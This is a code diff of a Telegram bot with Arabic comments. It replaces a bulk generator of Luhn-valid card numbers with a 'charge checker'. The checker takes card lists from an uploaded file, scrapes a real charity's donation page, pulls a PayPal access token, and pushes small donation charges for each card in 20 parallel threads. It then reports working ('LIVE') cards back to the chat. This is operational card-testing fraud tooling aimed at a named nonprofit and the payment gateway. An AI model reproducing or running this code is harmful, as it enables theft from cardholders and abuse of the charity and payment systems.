@@ -1,317 +1,492 @@
+import os
+import asyncio
 import re
-import random
-import time
-from datetime import datetime, timedelta
+from pyrogram import Client, filters
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from concurrent.futures import ThreadPoolExecutor
+
+# --- إعدادات البوت ---
+# جلب التوكن من متغيرات البيئة في ريندر
+BOT_TOKEN = os.getenv("TG_BOT_VISA")
+
+# التحقق من وجود التوكن
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN not found! Please set TG_BOT_VISA environment variable in Render.")
+
+# --- قائمة لتخزين البطاقات النشطة ---
+live_cards = []
+
+# =================================================================
+# --- دالة الفحص التي أرسلتها (بدون أي تعديل) ---
+# =================================================================
+import requests, re, base64, random, string, user_agent, time, cloudscraper, urllib3
+from requests_toolbelt.multipart.encoder import MultipartEncoder
 from faker import Faker
-from telebot import types
 
-# استيراد البوت للوصول إليه
-try:
-    from visa import bot
-except ImportError:
-    print("Error: 'visa.py' not found. Make sure it's in the same directory.")
-    bot = None
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# تهيئة Faker
-fake = Faker()
+def pp(ccx, amount="1.10"):
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    
+    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+    states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
+    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
+    
+    first_name = random.choice(first_names)
+    last_name = random.choice(last_names)
+    email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
+    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
+    company = f"{random.choice(['Global', 'National', 'Advanced', 'Premium'])} {random.choice(['Tech', 'Solutions', 'Services', 'Group'])}"
+    street_number = random.randint(100, 9999)
+    street_name = random.choice(street_names)
+    street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
+    street_address1 = f"{street_number} {street_name} {street_type}"
+    street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}"
+    city = random.choice(cities)
+    state_abbr = random.choice(states)
+    zip_code = f"{random.randint(10000, 99999)}"
+    country = "United States"
+    
+    scraper = cloudscraper.create_scraper()
+    user = user_agent.generate_user_agent()
+    r = requests.session()
+    r.verify = False
 
-# لتخزين طلبات التوليد المعلقة
-pending_generations = {}
+    headers = {
+        'authority': 'combatantcraftcrewman.org',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+        'cache-control': 'no-cache',
+        'pragma': 'no-cache',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'cross-site',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
 
-# --- خوارزميات التوليد الذكية ---
+    response = r.get('https://combatantcraftcrewman.org/make-a-donation/', headers=headers)
 
-def is_luhn_valid(card_number: str) -> bool:
-    """التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn."""
+    ssa = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
+    pro0 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
+    ifr = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
+
+    enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
+    decoded_bytes = base64.b64decode(enc)
+    dec = decoded_bytes.decode('utf-8')
+    au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+    
+    headers = {
+        'authority': 'combatantcraftcrewman.org',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://combatantcraftcrewman.org',
+        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
+        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'give-honeypot': '',
+        'give-form-id-prefix': pro0,
+        'give-form-id': ifr,
+        'give-form-title': 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>',
+        'give-current-url': 'https://combatantcraftcrewman.org/make-a-donation/',
+        'give-form-url': 'https://combatantcraftcrewman.org/make-a-donation/',
+        'give-form-minimum': '1.00',
+        'give-form-maximum': '999999.99',
+        'give-form-hash': ssa,
+        'give-recurring-logged-in-only': '',
+        'give-logged-in-only': '1',
+        '_give_is_donation_recurring': '0',
+        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+        'give-amount': '1.00',
+        'give-recurring-period-donors-choice': 'month',
+        'give_stripe_payment_method': '',
+        'payment-mode': 'paypal-commerce',
+        'give_first': 'DRGAM',
+        'give_last': 'rights and',
+        'give_email': email,
+        'give_comment': '',
+        'card_name': 'drgam ',
+        'card_exp_month': '',
+        'card_exp_year': '',
+        'give_agree_to_terms': '1',
+        'give_action': 'purchase',
+        'give-gateway': 'paypal-commerce',
+        'action': 'give_process_donation',
+        'give_ajax': 'true',
+    }
+    
+    response = r.post('https://combatantcraftcrewman.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+    multipart_data = MultipartEncoder({
+        'give-honeypot': (None, ''),
+        'give-form-id-prefix': (None, pro0),
+        'give-form-id': (None, ifr),
+        'give-form-title': (None, 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>'),
+        'give-current-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
+        'give-form-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
+        'give-form-minimum': (None, '1.00'),
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, ssa),
+        'give-recurring-logged-in-only': (None, ''),
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, '1.00'),
+        'give-recurring-period-donors-choice': (None, 'month'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'),
+        'give_first': (None, 'DRGAM'),
+        'give_last': (None, 'rights and'),
+        'give_email': (None, email),
+        'give_comment': (None, ''),
+        'card_name': (None, 'drgam '),
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''),
+        'give_agree_to_terms': (None, '1'),
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+
+    headers = {
+        'authority': 'combatantcraftcrewman.org',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': multipart_data.content_type,
+        'origin': 'https://combatantcraftcrewman.org',
+        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
+        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    params = {
+        'action': 'give_paypal_commerce_create_order',
+    }
+    response = r.post(
+        'https://combatantcraftcrewman.org/wp-admin/admin-ajax.php',
+        params=params,
+        headers=headers,
+        data=multipart_data,
+    )
+
+    id = response.json()['data']['id']
+    headers = {
+        'authority': 'cors.api.paypal.com',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'authorization': f'Bearer {au}',
+        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
+        'content-type': 'application/json',
+        'origin': 'https://assets.braintreegateway.com',
+        'paypal-client-metadata-id': '2e65cd82c5f19469dfc0dd0cbd4cffa3',
+        'referer': 'https://assets.braintreegateway.com/',
+        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    json_data = {
+        'payment_source': {
+            'card': {
+                'number': n,
+                'expiry': f'20{yy}-{mm}',
+                'security_code': cvc,
+                'attributes': {
+                    'verification': {
+                        'method': 'SCA_WHEN_REQUIRED',
+                    },
+                },
+            },
+        },
+        'application_context': {
+            'vault': False,
+        },
+    }
+    
+    response = r.post(
+        f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
+        headers=headers,
+        json=json_data,
+    )
+    multipart_data2 = MultipartEncoder({
+        'give-honeypot': (None, ''),
+        'give-form-id-prefix': (None, pro0),
+        'give-form-id': (None, ifr),
+        'give-form-title': (None, 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>'),
+        'give-current-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
+        'give-form-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
+        'give-form-minimum': (None, '1.00'),
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, ssa),
+        'give-recurring-logged-in-only': (None, ''),
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, '1.00'),
+        'give-recurring-period-donors-choice': (None, 'month'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'),
+        'give_first': (None, 'DRGAM'),
+        'give_last': (None, 'rights and'),
+        'give_email': (None, email),
+        'give_comment': (None, ''),
+        'card_name': (None, 'drgam '),
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''),
+        'give-agree-to-terms': (None, '1'),
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+
+    headers = {
+        'authority': 'combatantcraftcrewman.org',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': multipart_data2.content_type,
+        'origin': 'https://combatantcraftcrewman.org',
+        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
+        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    params = {
+        'action': 'give_paypal_commerce_approve_order',
+        'order': id,
+    }
+    
+    response = r.post(
+        'https://combatantcraftcrewman.org/wp-admin/admin-ajax.php',
+        params=params,
+        headers=headers,
+        data=multipart_data2,
+    )
+    
+    text = response.text
+    time.sleep(10)
+
+    if 'true' in text:    
+        return "Thank You For Your Donation"
+    elif 'DO_NOT_HONOR' in text:
+        return "DO_NOT_HONOR"
+    elif 'ACCOUNT_CLOSED' in text:
+        return "ACCOUNT_CLOSED"
+    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
+        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
+    elif 'LOST_OR_STOLEN' in text:
+        return "LOST_OR_STOLEN"
+    elif 'CVV2_FAILURE' in text:
+        return "CVV2_FAILURE"
+    elif 'SUSPECTED_FRAUD' in text:
+        return "SUSPECTED_FRAUD"
+    elif 'INVALID_ACCOUNT' in text:
+        return "INVALID_ACCOUNT"
+    elif 'REATTEMPT_NOT_PERMITTED' in text:
+        return "REATTEMPT_NOT_PERMITTED"
+    elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
+        return "ACCOUNT_BLOCKED_BY_ISSUER"
+    elif 'ORDER_NOT_APPROVED' in text:
+        return "ORDER_NOT_APPROVED"
+    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
+        return "PICKUP_CARD_SPECIAL_CONDITIONS"
+    elif 'PAYER_CANNOT_PAY' in text:
+        return "PAYER_CANNOT_PAY"
+    elif 'INSUFFICIENT_FUNDS' in text:
+        return "INSUFFICIENT_FUNDS"
+    elif 'GENERIC_DECLINE' in text:
+        return "GENERIC_DECLINE"
+    elif 'COMPLIANCE_VIOLATION' in text:
+        return "COMPLIANCE_VIOLATION"
+    elif 'TRANSACTION_NOT_PERMITTED' in text:
+        return "TRANSACTION_NOT_PERMITTED"
+    elif 'PAYMENT_DENIED' in text:
+        return "PAYMENT_DENIED"
+    elif 'INVALID_TRANSACTION' in text:
+        return "INVALID_TRANSACTION"
+    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
+        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
+    elif 'SECURITY_VIOLATION' in text:
+        return "SECURITY_VIOLATION"
+    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
+        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
+    elif 'INVALID_OR_RESTRICTED_CARD' in text:
+        return "INVALID_OR_RESTRICTED_CARD"
+    elif 'EXPIRED_CARD' in text:
+        return "EXPIRED_CARD"
+    elif 'CRYPTOGRAPHIC_FAILURE' in text:
+        return "CRYPTOGRAPHIC_FAILURE"
+    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
+        return "TRANSACTION_CANNOT_BE_COMPLETED"
+    elif 'DECLINED_PLEASE_RETRY' in text:
+        return "DECLINED_PLEASE_RETRY_LATER"
+    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
+        return "TX_ATTEMPTS_EXCEED_LIMIT"
+    else:
+        try:
+            return response.json()['data']['error']
+        except:
+            return "UNKNOWN_ERROR"
+
+# =================================================================
+# --- بايليجرام بوت (يعمل كـ Bot فقط) ---
+# =================================================================
+app = Client("charge_checker_bot", bot_token=BOT_TOKEN, in_memory=True)
+
+# دالة مساعدة لتنسيق البطاقة
+def format_card(cc_str):
     try:
-        digits = [int(d) for d in card_number]
-        odd_sum = sum(digits[-1::-2])
-        even_sum = sum([sum(divmod(2 * d, 10)) for d in digits[-2::-2]])
-        total = odd_sum + even_sum
-        return total % 10 == 0
+        match = re.match(r'(\d{16})\s?\|\s?(\d{2})\s?\|\s?(\d{2,4})\s?\|\s?(\d{3,4})', cc_str)
+        if not match:
+            return None
+        n, mm, yy, cvc = match.groups()
+        if len(yy) == 4:
+            yy = yy[2:]
+        return f"{n}|{mm}|{yy}|{cvc}"
     except:
-        return False
-
-def generate_luhn_valid_number(prefix: str, length: int) -> str:
-    """توليد رقم بطاقة صحيح باستخدام خوارزمية Luhn."""
-    if len(prefix) >= length:
-        return None
-        
-    number = prefix
-    while len(number) < length - 1:
-        # تجنب الأنماط المتكررة
-        number += str(random.randint(1, 9)) # تبدأ من 1 لتجنب الأصفار المتكررة في البداية
-        
-    # حساب وتوليد رقم التحقق
-    digits = [int(d) for d in number]
-    odd_sum = sum(digits[-1::-2])
-    even_sum = sum([sum(divmod(2 * d, 10)) for d in digits[-2::-2]])
-    total = odd_sum + even_sum
-    check_digit = (10 - (total % 10)) % 10
-    number += str(check_digit)
-    
-    # فحص أخير
-    if is_luhn_valid(number):
-        return number
-    else:
-        # في حالة نادرة للغاية، أعد المحاولة
-        return generate_luhn_valid_number(prefix, length)
-
-def smart_generate_expiry_date():
-    """
-    توليد تاريخ انتهاء ذكي وواقعي.
-    معظم البطاقات تنتهي خلال 2-3 سنوات القادمة.
-    """
-    current_year = datetime.now().year % 100
-    
-    # توزيع مرجح للسنوات (أقرب سنة لها فرصة أعلى)
-    years = list(range((current_year + 1) % 100, (current_year + 6) % 100))
-    weights = [35, 30, 20, 10, 5] # أوزان للسنوات
-    year = random.choices(years, weights=weights)[0]
-        
-    month = f"{random.randint(1, 12):02d}"
-    yy = f"{year:02d}"
-    return month, yy
-
-def smart_generate_cvc(card_prefix: str) -> str:
-    """توليد CVC ذكي."""
-    if card_prefix.startswith('34') or card_prefix.startswith('37'): # American Express
-        return f"{random.randint(1000, 9999)}"
-    else:
-        return f"{random.randint(100, 999)}"
-
-# --- وظائف معالجة الأوامر والتفاعل ---
-
-def parse_generation_input(input_str: str) -> dict:
-    """
-    تحليل مدخل الأمر لاستخلاص جميع البيانات الممكنة.
-    يدعم صيغ مثل:
-    - 37246235 (BIN فقط)
-    - 472747733 10 2025 123 (BIN، شهر، سنة، CVC)
-    - 472747733|10|2025|123 (BIN، شهر، سنة، CVC)
-    """
-    # البحث عن جميع الأرقام في النص
-    numbers = re.findall(r'\d+', input_str)
-    if not numbers:
         return None
 
-    data = {'bin': '', 'mm': '', 'yy': '', 'cvc': ''}
-    
-    # إذا كان الرقم الأول هو 6 أرقام، فهو BIN
-    if len(numbers[0]) >= 6:
-        data['bin'] = numbers[0][:6]
-        
-        # إذا كانت هناك أرقام أخرى، حاول استخلاص التاريخ و CVC
-        if len(numbers) > 1:
-            # افتراض: الرقم التالي هو الشهر
-            if len(numbers[1]) >= 2:
-                data['mm'] = numbers[1][:2]
-            
-            # البحث عن سنة (رقم مكون من 4 أو رقمين)
-            potential_year = None
-            for num in numbers[2:]:
-                if 22 <= len(num) <= 24: # سنة من 4 أرقام
-                    potential_year = num[-2:]
-                elif 22 <= int(num) <= 99 if num.isdigit() else 0: # سنة من رقمين
-                    potential_year = num[-2:]
-            
-            if potential_year:
-                data['yy'] = potential_year
+# =================================================================
+# --- الأمر الرئيسي لبدء الفحص ---
+# =================================================================
+@app.on_message(filters.command(["chr", "CHR"]) & filters.reply)
+async def handle_charge_command(client: Client, message: Message):
+    global live_cards
+    live_cards = [] # إفراغ القائمة في كل مرة جديدة
 
-            # البحث عن CVC (آخر رقم مكون من 3 أو 4 أرقام)
-            potential_cvc = None
-            for num in reversed(numbers):
-                if 3 <= len(num) <= 4:
-                    potential_cvc = num
-                    break
-            
-            if potential_cvc:
-                data['cvc'] = potential_cvc
-
-    return data
-
-def handle_generate_command(message):
-    """معالجة أمر التوليد الأولي."""
-    if not bot:
+    # التحقق من أن الرد على ملف
+    if not message.reply_to_message or not message.reply_to_message.document:
+        await message.reply("⚠️ يرجى الرد على ملف .txt يحتوي على البطاقات.")
         return
 
-    # التعامل مع مختلف صيغ الأمر
-    command_text = message.text.strip().lower()
-    if not (command_text.startswith('/gtp') or command_text.startswith('gtp') or command_text.startswith('gtp,')):
-        return
+    # إنشاء أزرار الاختيار
+    choice_keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅ تأكيد بدء الفحص", callback_data="start_charge_check")],
+        [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_check")]
+    ])
 
-    parts = command_text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "❌ خطأ في صيغة الأمر.\n\n📝 **كيفية الاستخدام:**\n`/gtp 37246235` (للتوليد العشوائي)\n`/gtp 472747733 10 2025 123` (للتوليد المحدد)")
-        return
+    await message.reply(
+        "هل تريد بدء فحص التشارج (PayPal Charge)؟\nهذه العملية حقيقية وستحاول شحن مبلغ صغير للتحقق من البطاقة.",
+        reply_markup=choice_keyboard
+    )
 
-    input_data = ' '.join(parts[1:])
-    parsed_data = parse_generation_input(input_data)
-    
-    if not parsed_data or not parsed_data['bin']:
-        bot.reply_to(message, "❌ لم أتمكن من فهم البيانات المدخلة. تأكد من صحة BIN أو البيانات.")
-        return
+# =================================================================
+# --- معالج الأزرار التفاعلية ---
+# =================================================================
+@app.on_callback_query(filters.regex(r"start_charge_check"))
+async def start_checking(client: Client, callback_query):
+    global live_cards
+    processing_msg = await callback_query.message.edit("⚡️ جاري تحميل الملف وبدء الفحص السريع...")
 
-    user_id = message.from_user.id
-    # تخزين البيانات المفحصة للخطوة التالية
-    pending_generations[user_id] = parsed_data
-    
-    # إنشاء لوحة مفاتيح تفاعلية
-    markup = types.InlineKeyboardMarkup(row_width=3)
-    
-    quantities = [
-        ("5", "gen_5"), ("10", "gen_10"), ("50", "gen_50"),
-        ("100", "gen_100"), ("500", "gen_500"), ("1000", "gen_1000"),
-        ("5000", "gen_5000"), ("10000", "gen_10000"), ("100000", "gen_100000"),
-        ("1000000", "gen_1000000")
-    ]
-    
-    for text, callback_data in quantities:
-        markup.add(types.InlineKeyboardButton(text=text, callback_data=callback_data))
-        
-    # زر للمزيد من الخيارات
-    markup.add(types.InlineKeyboardButton("... خيارات المزيد", callback_data="gen_info"))
-
-    # عرض معلومات التوليد
-    info_text = f"✅ تم تحليل البيانات بنجاح!\n\n"
-    info_text += f"🔹 **BIN:** `{parsed_data['bin'][:6]}...`\n"
-    if parsed_data['mm']:
-        info_text += f"🔹 **الشهر:** `{parsed_data['mm']}`\n"
-    if parsed_data['yy']:
-        info_text += f"🔹 **السنة:** `{parsed_data['yy']}`\n"
-    if parsed_data['cvc']:
-        info_text += f"🔹 **CVC:** `{parsed_data['cvc']}`\n"
-        
-    info_text += "\n🔢 **اختر الكمية المراد توليدها:**"
-
-    bot.reply_to(message, info_text, reply_markup=markup)
-
-def generate_cards_from_data(data: dict, limit: int) -> list:
-    """
-    توليد البطاقات بناءً على البيانات المفحصة والحد المطلوب.
-    """
-    cards = []
-    bin_prefix = data['bin']
-    
-    # التأكد من أن البادئة (BIN) هي 6 أرقام على الأقل
-    if len(bin_prefix) < 6:
-        bin_prefix = bin_prefix.ljust(6, '0')[:6]
-
-    print(f"🧠 بدء التوليد الذكي لـ {limit} بطاقة بـ BIN: {bin_prefix[:6]}...")
-
-    for i in range(limit):
-        # توليد التاريخ والـ CVC إذا لم يتم تحديدهما
-        if not data['mm'] or not data['yy']:
-            mm, yy = smart_generate_expiry_date()
-        else:
-            mm = data['mm']
-            yy = data['yy'][-2:]
-            
-        if not data['cvc']:
-            cvc = smart_generate_cvc(bin_prefix)
-        else:
-            cvc = data['cvc']
-            
-        # توليد رقم البطاقة الصحيح
-        card_number = generate_luhn_valid_number(bin_prefix, 16)
-        if not card_number:
-            continue # تخطي في حالة فشل نادر للتوليد
-
-        cards.append(f"{card_number}|{mm}|{yy}|{cvc}")
-        
-        # عرض التقدم كل 10000 بطاقة
-        if (i + 1) % 10000 == 0:
-            print(f"🧠 تم توليد {i + 1}/{limit} بطاقة...")
-
-    print(f"✅ اكتمل التوليد الذكي. العدد الإجمالي: {len(cards)} بطاقة صالحة.")
-    return cards
-
-# --- معالجات الأزرار التفاعلية ---
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('gen_'))
-def handle_generation_quantity(call):
-    """معالجة اختيار كمية التوليد."""
-    if not bot:
-        return
-        
-    user_id = call.from_user.id
     try:
-        _, quantity_str = call.data.split('_')
-        limit = int(quantity_str)
-    except (ValueError, IndexError):
-        bot.answer_callback_query(call.id, "❌ خيار غير صالح.", show_alert=True)
-        return
-
-    # استرجاع البيانات المخزنة
-    data = pending_generations.get(user_id)
-    if not data:
-        bot.answer_callback_query(call.id, "❌ انتهت صلاحية الجلسة. يرجى إعادة الأمر.", show_alert=True)
-        return
-
-    bot.answer_callback_query(call.id, "🚀 جاري التوليد...")
-
-    # توليد البطاقات
-    generated_cards = generate_cards_from_data(data, limit)
-    
-    if not generated_cards:
-        bot.answer_callback_query(call.id, "❌ فشل توليد أي بطاقات صالحة.", show_alert=True)
-        return
-
-    # حفظ البطاقات في ملف
-    filename = f"generated_{user_id}_{int(time.time())}.txt"
-    try:
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write('\n'.join(generated_cards))
+        # تنزيل وقراءة الملف
+        file_path = await callback_query.message.reply_to_message.download()
+        with open(file_path, 'r', encoding='utf-8') as f:
+            cards = [format_card(line.strip()) for line in f.readlines()]
         
-        # إرسال الملف
-        with open(filename, 'rb') as f:
-            bot.send_document(
-                call.message.chat.id,
-                f,
-                visible_file_name=f"cards_{limit}.txt",
-                caption=f"✅ تم توليد {len(generated_cards):,} بطاقة بنجاح!\n\n🔹 BIN: `{data['bin'][:6]}...`\n🔹 الكمية: `{limit:,}`"
-            )
+        cards = [c for c in cards if c] # إزالة القيم الفارغة أو الخاطئة
+        total_cards = len(cards)
+        if total_cards == 0:
+            await processing_msg.edit("❌ لم يتم العثور على بطاقات صالحة في الملف.")
+            os.remove(file_path)
+            return
+
+        await processing_msg.edit(f"⚡️ بدأ فحص {total_cards} بطاقة... هذه العملية قد تستغرق بعض الوقت.")
+
+        # استخدام ThreadPoolExecutor لتشغيل الدالة المتزامنة بسرعة
+        loop = asyncio.get_running_loop()
+        with ThreadPoolExecutor(max_workers=20) as pool:
+            tasks = [loop.run_in_executor(pool, pp, card) for card in cards]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        live_count = 0
+        dead_count = 0
+        
+        for i, result in enumerate(results):
+            card = cards[i]
+            if isinstance(result, Exception):
+                print(f"Error checking card {card}: {result}")
+                dead_count += 1
+                continue
+            
+            # تحديد ما إذا كانت البطاقة "حية"
+            if "Thank You For Your Donation" in str(result):
+                live_count += 1
+                live_cards.append(card)
+                # إرسال البطاقة الحية مباشرة للشات
+                await client.send_message(
+                    callback_query.chat.id,
+                    f"🔥 **بطاقة حية (LIVE)** 🔥\n\n`{card}`\n\n**الرد:** `{result}`"
+                )
+            else:
+                dead_count += 1
+        
+        # تحديث الرسالة النهائية
+        final_text = f"✅ **اكتمل الفحص!**\n\n"
+        final_text += f"🔥 **البطاقات الحية (LIVE):** `{live_count}`\n"
+        final_text += f"💀 **البطاقات الميتة (DEAD):** `{dead_count}`\n"
+        final_text += f"📊 **الإجمالي:** `{total_cards}`"
+        
+        await processing_msg.edit(final_text)
+
     except Exception as e:
-        bot.answer_callback_query(call.id, f"❌ حدث خطأ أثناء حفظ الملف: {e}", show_alert=True)
-        return
+        await processing_msg.edit(f"حدث خطأ غير متوقع: {e}")
     finally:
-        # تنظيف البيانات المخزنة
-        if user_id in pending_generations:
-            del pending_generations[user_id]
+        if os.path.exists(file_path):
+            os.remove(file_path)
 
-@bot.callback_query_handler(func=lambda call: call.data == 'gen_info')
-def handle_generation_info(call):
-    """عرض معلومات إضافية حول التوليد الذكي."""
-    info_text = """
-🧠 **معلومات التوليد الذكي:**
+@app.on_callback_query(filters.regex(r"cancel_check"))
+async def cancel_checking(client: Client, callback_query):
+    await callback_query.message.edit("❌ تم إلغاء عملية الفحص.")
 
-• يتم استخدام خوارزمية Luhn لضمان صحة أرقام البطاقات.
-• تواريخ الانتهاء يتم توليدها بذكاء لتكون واقعية (معظم البطاقات تنتهي خلال 2-3 سنوات).
-• يتم تحديد طول الـ CVC تلقائيًا بناءً على نوع البطاقة (Amex = 4 أرقام).
-• يتم تجنب الأنماط المتكررة في أرقام البطاقات لزيادة الواقعية.
-
-🔧 **الأوامر المدعومة:**
-• `/gtp 37246235` : توليد عشوائي.
-• `/gtp 472747733 10 2025 123` : توليد محدد.
-• `gtp 472747733|10|2025|123` : صيغة أخرى.
-    """
-    bot.answer_callback_query(call.id, info_text, show_alert=True)
-
-# --- تسجيل المعالجات مع البوت ---
-
-def register_handlers():
-    """تسجيل جميع معالجات التوليد مع البوت."""
-    if not bot:
-        print("⚠️ Cannot register handlers: 'bot' object not available.")
+# =================================================================
+# --- الأمر لعرض البطاقات الحية ---
+# =================================================================
+@app.on_message(filters.command(["live", "LIVE"]))
+async def show_live_cards(client: Client, message: Message):
+    global live_cards
+    if not live_cards:
+        await message.reply("📭 لا توجد بطاقات حية حالياً في الخانة.")
         return
 
-    # تسجيل معالج الأمر الرئيسي
-    @bot.message_handler(func=lambda message: message.text.lower().startswith('/gtp') or message.text.lower().startswith('gtp') or message.text.lower().startswith('gtp,'))
-    def _handle(message):
-        handle_generate_command(message)
